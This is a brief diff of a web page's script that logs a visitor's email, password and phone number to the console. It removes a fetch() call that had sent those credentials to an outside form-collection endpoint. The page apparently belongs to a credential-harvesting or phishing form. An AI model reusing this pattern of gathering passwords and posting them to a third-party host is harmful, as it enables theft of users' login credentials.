@@ -152,25 +152,6 @@
 
         // Log the phone number along with email and password
         console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
-
-        // Send data to Getform
-        fetch('https://getform.io/f/avrmyepa', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: window.email,
-                password: window.password,
-                phone: phone
-            })
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Handle response from server
-            alert('Form submitted successfully!');
-        })
-        .catch(error => console.error('Error:', error));
     });
 </script>
 
